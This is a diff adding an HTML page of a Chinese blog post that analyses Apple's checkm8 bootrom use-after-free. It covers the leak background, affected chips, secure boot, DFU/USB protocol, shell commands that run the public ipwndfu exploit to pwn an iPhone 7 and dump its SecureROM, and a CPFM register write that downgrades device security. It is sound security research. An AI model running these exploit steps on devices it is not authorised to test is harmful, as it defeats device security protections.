@@ -1,0 +1,2388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="http://localhost:4000/assets/fonts/fonts.css"/>
+<link rel="stylesheet" href="http://localhost:4000/assets/style.css"/>
+<link rel="stylesheet" href="http://localhost:4000/assets/js/lity.min.css"/>
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta property="og:site_name" content="极目楚天舒" />
+<meta 
+    property="og:title"
+    content="
+        
+            深入分析苹果设备 checkm8 漏洞
+        
+    " 
+/>
+
+<meta property="og:url" content="http://localhost:4000//hardware/2025/05/25/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%E8%8B%B9%E6%9E%9C%E8%AE%BE%E5%A4%87-checkm8-%E6%BC%8F%E6%B4%9E.html" />
+
+    <meta property="og:type" content="article" />
+
+
+
+    <meta property="fb:app_id" content="" />
+
+
+
+<title>
+    
+        深入分析苹果设备 checkm8 漏洞
+    
+</title>
+</head>
+<body class="index">
+    
+        <div class="page-container">
+            <aside class="main-sidebar">
+                <!-- 包含 TOC -->
+                <sidebar class="sidebar">
+<ul class="toc-list"><li><a href="#事件背景">事件背景</a><ul><li><a href="#事件发展">事件发展</a></li><li><a href="#影响范围">影响范围</a></li></ul></li><li><a href="#研究对象">研究对象</a></li><li><a href="#ios安全启动机制">iOS安全启动机制</a><ul><li><a href="#securerom简介">SecureROM简介</a></li></ul></li><li><a href="#dfu模式协议">DFU模式/协议</a><ul><li><a href="#dfu模式和dfu协议介绍">DFU模式和DFU协议介绍</a></li><li><a href="#usb通信过程">USB通信过程</a></li></ul></li><li><a href="#iphone7进入dfu模式的方法">iPhone7进入DFU模式的方法</a><ul><li><a href="#关机状态下进入dfu">关机状态下进入DFU</a></li><li><a href="#开机状态下进入dfu">开机状态下进入DFU</a></li></ul></li><li><a href="#ipwndfu工具初探">ipwndfu工具初探</a></li><li><a href="#苹果设备启动过程">苹果设备启动过程</a><ul><li><a href="#securerom做的事情">SecureROM做的事情</a></li><li><a href="#苹果设备的dfu模式">苹果设备的DFU模式</a></li><li><a href="#设备安全性降级">设备安全性降级</a></li></ul></li><li><a href="#漏洞分析">漏洞分析</a><ul><li><a href="#usb子系统初始化">USB子系统初始化</a></li><li><a href="#dfu生命周期">DFU生命周期</a></li><li><a href="#dfu镜像接收过程">DFU镜像接收过程</a></li><li><a href="#usb资源析构">USB资源析构</a></li><li><a href="#uaf-漏洞函数">UAF 漏洞函数</a></li><li><a href="#内存泄漏bug">内存泄漏BUG</a></li><li><a href="#利用思路">利用思路</a></li><li><a href="#堆块控制能力">堆块控制能力</a></li><li><a href="#堆管理器">堆管理器</a></li><li><a href="#securerom内存布局">SecureROM内存布局</a></li></ul></li><li><a href="#ipwndfu分析">ipwndfu分析</a><ul><li><a href="#堆风水">堆风水</a></li><li><a href="#堆模拟器">堆模拟器</a></li><li><a href="#控制流劫持">控制流劫持</a></li></ul></li><li><a href="#rop过程分析">ROP过程分析</a><ul><li><a href="#拷贝rop链">拷贝ROP链</a></li><li><a href="#rop链的推进">ROP链的推进</a></li><li><a href="#fx指令片段">“f(x)”指令片段</a></li><li><a href="#关闭wxn">关闭WXN</a></li><li><a href="#跳转到shellcode执行">跳转到shellcode执行</a></li><li><a href="#crauemu插件模拟rop过程">crauEmu插件模拟ROP过程</a></li></ul></li><li><a href="#shellcode执行">shellcode执行</a></li><li><a href="#功能扩展">功能扩展</a></li><li><a href="#事件回顾">事件回顾</a><ul><li><a href="#checkm8能力及威胁评估">checkm8能力及威胁评估</a></li><li><a href="#事件后续">事件后续</a></li></ul></li><li><a href="#固件分析方法">固件分析方法</a><ul><li><a href="#加载地址的恢复">加载地址的恢复</a></li><li><a href="#ida分析过程">IDA分析过程</a><ul><li><a href="#参数的修改">参数的修改</a></li></ul></li></ul></li><li><a href="#参考资料">参考资料</a></li><li><a href="#附件">附件</a></li></ul></sidebar>
+            </aside>
+            <!-- 主内容区域 -->
+            <main class="main-content">
+                <header class="header">
+    <section class="logo">
+        <a href="http://localhost:4000/" class="logo__link">
+            
+                <h1>极目楚天舒</h1>
+            
+        </a>
+    </section>
+    
+    <button id="menuToggle">
+        <div></div>
+        <div></div>
+        <div></div>
+    </button>
+    <nav class="menu">
+        
+<ul class="list primary">
+
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/linux_kernel.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/tux.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Linux kernel</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/linux_userspace.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/userspace.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Linux userspace</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/hardware.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/chip.svg"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Hardware</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/meltdown_spectre.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/meltdown_spectre.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Side Channel</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+        <li class="item">
+
+            <div class="item-controls">
+                <a href="http://localhost:4000/category/riscv.html">
+                
+                    <img src="http://localhost:4000/assets/img/icons/riscv.png"/>
+                
+                
+                    <p style="color: var(--c-themeHueRed)">Riscv</p>
+                
+                </a>
+
+            
+            </div>
+            
+        </li>   
+    
+</ul>
+    </nav>
+</header>
+                
+                <article class="post">
+
+    <div class="post__title">
+       深入分析苹果设备 checkm8 漏洞
+    </div>
+    <div class="post__meta"> 
+        <div class="post__meta__category">
+            
+                <p class="post__meta__category__title" style="background: var(--c-themeHueOrange)">Hardware</p>
+            
+        </div>
+        <p class="post__meta__divider">·</p>
+        <div class="post__meta__date">
+            2025-05-25
+        </div>
+        
+    </div>
+
+    
+    <div class="post__content">
+        <p>checkm8是影响苹果A5～A11系列芯片的bootrom漏洞，该漏洞位于USB协议栈，包含了一个释放后重引用漏洞和一个内存泄漏bug。攻击者利用checkm8可以实现bootrom级别的任意代码执行，破坏设备的安全启动链，实现苹果设备固件dump和系统越狱。漏洞在生产阶段已经固化在芯片的ROM区域，无法通过软件更新来修补。</p>
+
+<p>checkm8最早由littlelailo在2019年5月31日公布并被命名为“moonshine”，当时漏洞利用已经在A8芯片上完成了适配。时隔3个月2019年9月27日checkra1n团队成员axi0mX在推特公布了该漏洞，正式命名为“checkm8”，同一天公开了漏洞利用工具ipwndfu，实现了A系列芯片大范围适配，以其能够将当时最新苹果设备的核心机密SecureROM成功dump出来而一夜走红，成为当时的热点事件，而checkm8这个叫法也因此被大众所熟知。</p>
+
+<p>checkm8的魅力在于，至今为止它仍然是越狱老旧苹果设备的主要手段，越狱社区也基于该漏洞开发出了成熟稳定的越狱软件chackra1n。</p>
+
+<h1 id="事件背景">事件背景</h1>
+
+<h2 id="事件发展">事件发展</h2>
+
+<ul>
+  <li>2018年2月8日iBoot源码泄漏事件：</li>
+</ul>
+
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzkzMDY1NDgyOQ==&amp;mid=2247777999&amp;idx=1&amp;sn=bc4b3713a056320dfc2a63152d8682dd&amp;source=41#wechat_redirect"><strong>史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上</strong></a></p>
+
+<p><a href="https://www.zhihu.com/question/266898229"><strong>如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？</strong></a></p>
+
+<ul>
+  <li>
+    <p>2018年2月9日苹果发布声明<a href="https://tech.sina.com.cn/it/2018-02-09/doc-ifyrkuxs4997460.shtml">“<strong>该源代码已过时 不必担忧</strong>”</a></p>
+  </li>
+  <li>
+    <p>2019年9月27日国外安全员<a href="https://x.com/axi0mX">@axi0mX</a>通过公开了一个iPhone BootROM 的漏洞和<a href="https://github.com/axi0mX/ipwndfu">漏洞利用工具</a>：</p>
+  </li>
+</ul>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_08.58.11.png" alt="截屏2025-03-18 08.58.11.png" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.10.37.png" alt="截屏2025-03-18 10.10.37.png" /></p>
+
+<p><a href="https://www.expreview.com/70777.html"><strong>为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？</strong></a></p>
+
+<p><a href="https://zhuanlan.zhihu.com/p/87456653"><strong>iPhone史诗级漏洞checkm8攻击原理浅析</strong></a></p>
+
+<p>为什么我们把checkm8漏洞用“史诗”来形容，因为该漏洞影响面之广，引发的反响之强烈，对研究苹果安全具有深远的意义。作者认为该漏洞在苹果越狱史上能留下一笔，称之为“EPIC JAILBREAK”。</p>
+
+<p>源码泄漏事件发生后，大部分吃瓜网友从iOS操作系统的角度认为这并不是一件值得大惊小怪的事情，但这也不排除是苹果请来的水军……</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.03.51.png" alt="截屏2025-03-18 10.03.51.png" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.04.29.png" alt="截屏2025-03-18 10.04.29.png" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.04.57.png" alt="截屏2025-03-18 10.04.57.png" /></p>
+
+<p>苹果当时也希望此事低调处理，把公众的视线引向“过时的iOS源代码”这一话题。</p>
+
+<p>因为大部分人不了解设备底层，所以不知道这份泄漏源码对破解iPhone的重要性。</p>
+
+<p>但最早在Reddit上公布“iBoot 源码已被泄漏”这一消息的用户Apple External表示，“泄漏的代码里面包含了bootrom的源代码，并且这份bootrom源码已经在多个设备上面使用”。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/640.webp" alt="640.webp" /></p>
+
+<p>这个事情的性质就完全不同了，因为iOS源码可以通过打补丁的方式修补漏洞。但是bootrom级别的漏洞，引导阶段被利用，大概率只能先放着了。</p>
+
+<p>假如苹果为将来的型号囤了大量的芯片，或者当时正在热销的型号用了这些芯片（iPhone X、iPhone 8/8 Plus当时正在热销，iPad 6当年发布，iPad 7于2019年发布，iPod Touch 7于2019年发布），如果这些芯片存在着不可修复的bootrom漏洞，也就意味着现在的漏洞能攻陷将来的设备……，因为苹果不太可能因为这个事情就把真金白银采购的芯片做报废处理吧。</p>
+
+<p>快进到2019年9月27日@axi0mX公开的<a href="https://x.com/axi0mX/status/1177542201670168576">checkm8</a>漏洞及其漏洞利用工具<a href="https://github.com/axi0mX/ipwndfu">ipwndfu</a></p>
+
+<p>1年前泄漏的iBoot源代码和checkm8漏洞的发现到底有没有关系？</p>
+
+<p>axi0mX声称他是通过补丁对比发现了这一漏洞。2018年夏，苹果在iOS12中修补了iBoot USB代码中的一个UAF漏洞。根据泄漏的iBoot看，iBoot和SecureROM共享了部分代码，所以axi0mX猜测在SecureROM中也存在该漏洞也是合理的。他并没有明说参考了泄漏的源码。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.55.37.png" alt="截屏2025-03-18 13.55.37.png" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.54.57.png" alt="截屏2025-03-18 13.54.57.png" /></p>
+
+<p>事后axi0mX用戏谑的语气说到“量子物理学的叠加理论表明，在有人审计SecureROM之前，可利用的漏洞既存在又不存在，这是一种状态的叠加”。</p>
+
+<p>我们纵观整个iPhone越狱史，前人已经做了大量的工作，SecureROM的堆管理器和地址空间布局已经摸的大差不差了，再加上泄漏源码的助攻、官方补丁的提示，这说明最早在2018年年底，各种必要的条件已经具备，checkm8确实已经呼之欲出。</p>
+
+<p>所以外界猜测，2018年泄漏的iBoot源码在checkm8的挖掘与利用上起到了一定程度的作用。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_14.07.21.png" alt="截屏2025-03-18 14.07.21.png" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.52.58.png" alt="截屏2025-03-18 13.52.58.png" /></p>
+
+<p>据我们团队分析，ipwndfu工具在芯片型号适配、芯片命名、关键数据结构、ROP片段的选取等细节方面与泄漏的源码有较高的匹配程度。</p>
+
+<h2 id="影响范围">影响范围</h2>
+
+<p>| <strong>SoC型号</strong> | <strong>内部代号</strong> | <strong>受影响的设备</strong> | <strong>图片</strong> |
+| — | — | — | — |
+| A5 | S5L8940XSI | iPhone 4S， iPad 2 |  |
+| A5 | S5L8942XSI | iPod touch 4，iPad 2/mini 1G，Apple TV 3 |  |
+| A5 | S5L8947XSI | Apple TV 2/3 |  |
+| A5X | S5L8945XSI | iPad 3 |  |
+| A6 | S5L8950XSI | iPhone 5/5C |  |
+| A6X | S5L8955XSI | iPad4 |  |
+| A7 | S5L8960XSI | iPhone 5S，iPad Air 1，iPad mini 2/3 |  |
+| S1 | S7002SI | Apple Watch 1代 |  |
+| A8 | T7000SI | iPhone 6/6 plus， iPad mini 4， Apple TV 4，iPod touch 6 |  |
+| A8X | T7001SI | iPad Air 2 |  |
+| A9 | S8000SI | iPhone 6S/6S plus，iPhone SE一代，iPad5 |  |
+| A9X | S8001SI | iPad Pro 1代 |  |
+| A10 | T8010SI | iPhone 7/7 plus，iPad 6/7，iPod touch 7 |  |
+| A10X | T8011SI | iPad Pro（2017），Apple TV 4K |  |
+| A11 | T8015SI | iPhone 8/ 8 plus/X |  |
+|  | T8002SI | Apple Watch Series 1/2 |  |
+| S3 | T8004SI | Apple Watch Series 3 |  |</p>
+<ul>
+  <li>iPhone设备</li>
+</ul>
+
+<p>iPhone 4S，iPhone 5 / 5C / 5S，iPhone 6 / 6 Plus / 6S / 6S plus，iPhone SE 一代，iPhone 7 / 7 Plus，iPhone 8 / 8 Plus，iPhone X</p>
+
+<ul>
+  <li>iPad设备</li>
+</ul>
+
+<p>iPad Air 1，iPad mini 1G，iPad 2 / mini 2，iPad 3 / mini3，iPad 4 / mini4，iPad 5，iPad 6，iPad 7，iPad Pro 1代</p>
+
+<ul>
+  <li>iPod设备</li>
+</ul>
+
+<p>iPod touch 4，iPod touch 6，iPod touch 7</p>
+
+<ul>
+  <li>Apple TV设备</li>
+</ul>
+
+<p>Apple TV 2，Apple TV 3，Apple TV 4，Apple TV 4K</p>
+
+<ul>
+  <li>Apple Watch设备</li>
+</ul>
+
+<p>Apple Watch 1代，Apple Watch Series 1 / 2 / 3</p>
+
+<ul>
+  <li>不受影响的设备</li>
+</ul>
+
+<p>使用A12及以上芯片的设备不受影响，例如iPhone XS / XR</p>
+
+<h1 id="研究对象">研究对象</h1>
+
+<p>研究对象是淘宝二手iPhone7手机。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/WechatIMG921.jpg" alt="WechatIMG921.jpg" /></p>
+
+<p>iPhone7手机使用的SoC处理器是苹果A10芯片，该芯片苹果内部代号为T8010SI。</p>
+
+<p>A10芯片使用的是<strong>ARMv8-A</strong> 架构，支持 AArch64和 AArch32两种执行状态。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.54.29.png" alt="截屏2025-03-09 13.54.29.png" /></p>
+
+<h1 id="ios安全启动机制">iOS安全启动机制</h1>
+
+<p>参考链接：</p>
+
+<p><a href="https://zhuanlan.zhihu.com/p/87456653">https://zhuanlan.zhihu.com/p/87456653</a></p>
+
+<p><a href="https://newosxbook.com/bonus/iBoot.pdf">https://newosxbook.com/bonus/iBoot.pdf</a></p>
+
+<p>iOS老旧设备的启动过程分为4个阶段：BootROM —&gt; LLB —&gt; iBoot —&gt; Kernelcache。</p>
+
+<p>从A10处理器开始，LLB阶段被合并到iBoot，由BootROM直接启动iBoot，启动过程变为3个阶段：</p>
+
+<p>BootROM  —&gt; iBoot —&gt; Kernelcache。</p>
+
+<p>以下是苹果对iBoot的定义：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iBoot</span>
+
+<span class="n">Code</span> <span class="n">that</span> <span class="n">loads</span> <span class="n">XNU</span><span class="p">,</span> <span class="k">as</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="n">secure</span> <span class="n">boot</span> <span class="n">chain</span><span class="p">.</span> <span class="n">Depending</span> <span class="n">on</span> <span class="n">the</span> 
+<span class="n">system</span> <span class="n">on</span> <span class="nf">chip </span><span class="p">(</span><span class="n">SoC</span><span class="p">)</span> <span class="n">generation</span><span class="p">,</span> <span class="n">iBoot</span> <span class="n">may</span> <span class="n">be</span> <span class="n">loaded</span> <span class="n">by</span> <span class="n">the</span> <span class="n">Low</span><span class="o">-</span><span class="n">Level</span> <span class="n">Bootloader</span> 
+<span class="ow">or</span> <span class="n">directly</span> <span class="n">by</span> <span class="n">the</span> <span class="n">Boot</span> <span class="n">ROM</span><span class="p">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>BootROM</li>
+</ul>
+
+<p>固化在CPU内部的一段代码，CPU上电后执行的第一行代码，作用是初始化系统环境，对iBoot进行加载和验签，若验证通过则跳转到iBoot；</p>
+
+<ul>
+  <li>iBoot</li>
+</ul>
+
+<p>第二阶段引导程序，作用是进一步初始化环境，对内核进行加载和验签，若内核验证通过则跳转到内核；</p>
+
+<ul>
+  <li>Kernelcache</li>
+</ul>
+
+<p>iOS系统内核，对OS进行加载和验签；</p>
+
+<ul>
+  <li>OS</li>
+</ul>
+
+<p>iOS用户界面、后台服务等非核心组件。OS和Kernelcache的关系类比Android和Linux内核的关系。</p>
+
+<ul>
+  <li>APP</li>
+</ul>
+
+<p>苹果设备运行的用户APP也需要经过验签才能运行。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%90%AF%E5%8A%A8%E9%98%B6%E6%AE%B5.jpg" alt="checkm8-启动阶段.jpg" /></p>
+
+<p>可以看到，苹果设备的启动被划分为多个阶段，前一个阶段要验证后一个阶段的代码是否经过苹果签名，验证通过才会加载并运行后一个阶段，由此形成一条信任链，确保最终用户操作的数据和代码是安全的没有被恶意修改过的。</p>
+
+<h2 id="securerom简介">SecureROM简介</h2>
+
+<p>SecureROM是苹果对BootROM的内部称呼，它俩是一个东西。</p>
+
+<p>SecureROM是泄漏的iBoot工程文件的一部分，位于apps/SecureROM目录下。</p>
+
+<p>SecureROM 作为系统启动时执行的第一段程序，扮演着整个安全启动链技术的信任基石。</p>
+
+<p>iOS的根证书被烧录在芯片的ROM中。系统的启动从根证书开始一级一级校验，确保加载的下一级内容是经过苹果签名的，任何一级校验失败都会导致设备无法启动，文件系统无法解密。</p>
+
+<p>根证书被添加在SecureROM的末尾，在芯片制造过程中随着SecureROM一起烧录进去。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-14_16.09.43.png" alt="截屏2025-03-14 16.09.43.png" /></p>
+
+<p>SecureROM的安全体现在：</p>
+
+<ul>
+  <li>封杀写权限</li>
+</ul>
+
+<p>芯片制造出来之后就无法被修改，即使是苹果公司也无法在成品芯片上面修改。</p>
+
+<ul>
+  <li>封杀读权限</li>
+</ul>
+
+<p>从BootROM跳转到iBoot的过程中，要经过一段trampoline代码，这段代码通过置位系统安全寄存器，关闭了ROM的读取权限。也就是说过了SecureROM阶段，即使在iBoot阶段攻破系统，也读不到SecureROM和根证书的内容。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-14_15.58.40.png" alt="截屏2025-03-14 15.58.40.png" /></p>
+
+<p>一位知乎博主评价说：“苹果的想法很单纯——如果一段程序黑客读都读不到，改也改不了，那么这段程序应该就会很安全。我们连程序内容都看不到，怎么分析程序漏洞？”</p>
+
+<h1 id="dfu模式协议">DFU模式/协议</h1>
+
+<h2 id="dfu模式和dfu协议介绍">DFU模式和DFU协议介绍</h2>
+
+<p>Device Firmware Update（DFU）“设备固件升级”的简称，是作为启动失败的保护。</p>
+
+<p>DFU模式是苹果手机救砖的最后手段，当设备因系统崩溃、越狱失败、OTA 升级失败或其他严重问题而无法正常启动时，DFU模式可以帮助恢复设备。</p>
+
+<p>SecureROM实现了DFU模式，在DFU模式下可以对设备固件进行升级或者降级，在DFU过程中用户数据可能会被擦除。</p>
+
+<p>有2种方式可以进入DFU模式：1. iBoot验证不通过无法加载 2. 通过GPIO引脚设置，按键进入DFU模式就是GPIO引脚设置的方法。</p>
+
+<p>USB协议栈对DFU协议做了描述：<a href="https://usb.org/sites/default/files/DFU_1.1.pdf">https://usb.org/sites/default/files/DFU_1.1.pdf</a></p>
+
+<p>USB DFU协议是基于USB<a href="https://www.usbzh.com/article/detail-55.html">控制传输</a>模式的，定义了固件升级中主机和设备的通信过程。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-DFU%E5%8D%8F%E8%AE%AE.jpg" alt="checkm8-DFU协议.jpg" /></p>
+
+<h2 id="usb通信过程">USB通信过程</h2>
+
+<p>USB也许是我们最熟悉，但又是最陌生的数据通信协议。最熟悉是因为USB设备随处可见，我们不经意中就会用到USB。最陌生是因为随着硬件的发展，USB协议的内涵已经远超最初的框架，兼容了大量的设备，成为了宇宙通用协议。</p>
+
+<p>主机和设备端点之间有4种通信模式，分别为<a href="https://www.usbzh.com/article/detail-109.html">中断传输</a>模式，<a href="https://www.usbzh.com/article/detail-55.html">控制传输</a>模式、<a href="https://www.usbzh.com/article/detail-40.html">批量传输</a>模式和<a href="https://www.usbzh.com/article/detail-118.html">同步传输</a>模式。</p>
+
+<p>USB DFU模式使用的是控制传输模式。该模式下一次传输称为Transaction，一个Transaction包含3个阶段：</p>
+
+<ul>
+  <li>Setup阶段
+    <ul>
+      <li>主机向设备发送setup token</li>
+      <li>主机向设备发送setup数据，由协议栈实现
+        <ul>
+          <li>bmRequestType，定义请求的方向、请求类型和接收者</li>
+          <li>bRequest， 定义的请求的具体事项</li>
+          <li>wValue、wIndex，根据bRequest的不同而具体定义</li>
+          <li>wLength，Data阶段发送/接收的数据长度</li>
+        </ul>
+      </li>
+      <li>设备向主机应答ACK</li>
+    </ul>
+  </li>
+  <li>Data阶段，数据通信方向由Setup阶段的bmRequestType决定，主机从设备获取数据就是IN，设备从主机接收数据或者执行命令就是OUT。数据分段为最小数据传输单元进行传输，在iPhone DFU模式中最小传输单元是0x40字节。
+    <ul>
+      <li>主机到设备传输OUT
+        <ul>
+          <li>主机向设备发送OUT token，表示主机已经做好发送数据的准备</li>
+          <li>主机向设备发送一个最小数据传输单元</li>
+          <li>设备向主机应答ACK表示接收成功</li>
+        </ul>
+      </li>
+      <li>设备向主机传输IN
+        <ul>
+          <li>主机向设备发送IN token，表示主机已经做好接收数据的准备</li>
+          <li>设备向主机发送一个最小数据传输单元</li>
+          <li>主机向设备应答ACK表示接收成功</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Status阶段，所有数据传输完毕
+    <ul>
+      <li>对于OUT传输，主机向设备发送IN token，设备向主机返回一个空数据包表示成功</li>
+      <li>对于IN传输，主机向设备发送OUT token，随后再向设备发送一个空数据包表示成功</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.42.52.png" alt="截屏2025-03-12 10.42.52.png" /></p>
+
+<p>以上3个阶段组成一个Transaction。</p>
+
+<p>从抓包数据来看，不一定每个IN或者OUT token都能被正确应答。一次最小数据单元的传输，只有被正确应答才能进行下一个传输。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.59.25.png" alt="截屏2025-03-12 10.59.25.png" /></p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.38.22.png" alt="截屏2025-03-12 10.38.22.png" /></p>
+
+<h1 id="iphone7进入dfu模式的方法">iPhone7进入DFU模式的方法</h1>
+
+<h2 id="关机状态下进入dfu">关机状态下进入DFU</h2>
+
+<ol>
+  <li>打开爱思助手，并将 iPhone 连接在电脑上；</li>
+  <li>长按电源键关闭 iPhone；</li>
+  <li>长按<strong>电源键</strong> 3 秒，之后同时按下<strong>电源键</strong>和<strong>「音量 -」键</strong> 10 秒；</li>
+  <li>松开电源键，继续按住<strong>「音量 -」键</strong> 5 秒；</li>
+  <li>如果此时屏幕处于黑屏状态，同时 iTunes 提示检测到一台处于恢复模式的 iPhone，则表示进入 DFU 模式。</li>
+</ol>
+
+<h2 id="开机状态下进入dfu">开机状态下进入DFU</h2>
+
+<ol>
+  <li>按下<strong>「音量 -」；</strong></li>
+  <li>按下电源键；</li>
+  <li>屏幕会先点亮，然后黑屏，黑屏4秒钟之后松开电源键；</li>
+  <li>10秒钟后再松开<strong>「音量 -」。</strong></li>
+</ol>
+
+<h1 id="ipwndfu工具初探">ipwndfu工具初探</h1>
+
+<p><a href="https://github.com/axi0mX/ipwndfu">ipwndfu</a>工具是一个旧款iPhone手机的越狱合集，可以利用这次的checkm8漏洞实现对iPhone7手机的SecureROM固件提取。</p>
+
+<p>该工具运行在Python2.7.18环境下，需要进行miniconda虚拟环境配置：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 下载安装python2.7.18环境</span>
+<span class="nv">$ </span>conda create <span class="nt">-n</span> checkm8 <span class="nv">python</span><span class="o">=</span>2.7
+<span class="c"># 激活环境</span>
+<span class="nv">$ </span>conda activate checkm8
+<span class="c"># 执行exp</span>
+<span class="nv">$ </span><span class="nb">sudo </span>python2 ./ipwndfu <span class="nt">-p</span>
+<span class="c"># 把SecurityROM dump到本级目录</span>
+<span class="nv">$ </span><span class="nb">sudo </span>python2 ./ipwndfu <span class="nt">--dump-rom</span>
+<span class="c"># 退出环境</span>
+<span class="nv">$ </span>conda deactivate checkm8
+</code></pre></div></div>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_14.29.57.png" alt="截屏2025-02-20 14.29.57.png" /></p>
+
+<p>SecureROM-t8010si-2696.0.0.1.33-ROMRELEASE.dump就是通过漏洞dump出来的SoC里面的SecurityROM。</p>
+
+<p>可以与<a href="https://securerom.fun/">https://securerom.fun/</a>这里下载的固件进行比对，经测试，固件是一致的。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_14.55.35.png" alt="截屏2025-02-20 14.55.35.png" /></p>
+
+<h1 id="苹果设备启动过程">苹果设备启动过程</h1>
+
+<h2 id="securerom做的事情">SecureROM做的事情</h2>
+
+<ul>
+  <li>平台启动：设置特定于平台的寄存器；</li>
+  <li>重定位循环：</li>
+  <li>CPU初始化：初始化MMU、设置系统寄存器SCTLR；</li>
+  <li>初始化时钟、SRAM总线、GPIO引脚；</li>
+  <li>在A12平台上，会设置ARMv8.3的PAC随机种子；</li>
+  <li>系统初始化：初始化堆和进程子系统；</li>
+  <li>平台早期初始化：苹果设备特定初始化例程，包括电源管理、主板和芯片初始化、串口初始化；</li>
+  <li>检查DFU引脚，确定是否强制进入DFU模式；</li>
+  <li>平台后期初始化：其他的苹果设备特定初始化例程，主板其他组件的初始化；</li>
+  <li>获取引导设备和所选的引导配置。这通常会加载下一阶段（由illb标签标记）。但如果该阶段无法加载（或者前面被强制DFU了），那么就会下降到DFU模式；</li>
+</ul>
+
+<h2 id="苹果设备的dfu模式">苹果设备的DFU模式</h2>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_17.05.17.png" alt="截屏2025-02-20 17.05.17.png" /></p>
+
+<p>然后SecureROM等待DFU下载请求。通常情况可以向设备传送一个(recovery mode LLB/iBoot)iBSS镜像，如果验证通过，镜像将被启动。</p>
+
+<h2 id="设备安全性降级">设备安全性降级</h2>
+
+<p>设备出厂时会对CPFM写入值用于确定保护等级，CPFM一旦写入就不可更改。</p>
+
+<p>零售产品CPFM=3，表示“安全、产品”</p>
+
+<p>工程机的CPFM通常是1（安全、开发）或者0（不安全、开发）。</p>
+
+<p>但是SecureROM会把CPFM读进内存，然后设置安全等级。</p>
+
+<p>尽管CPFM是不可修改的，但是CPFM被SecureROM加载到寄存器中，该寄存器又被映射到内存地址，并且是可写的。</p>
+
+<p>因此我们只要把寄存器的值修改掉，就可以降低设备的安全等级，打开JTAG调试器。</p>
+
+<p>需要注意的是，设备降级在下一次重启之后就会失效，并不是永久的。</p>
+
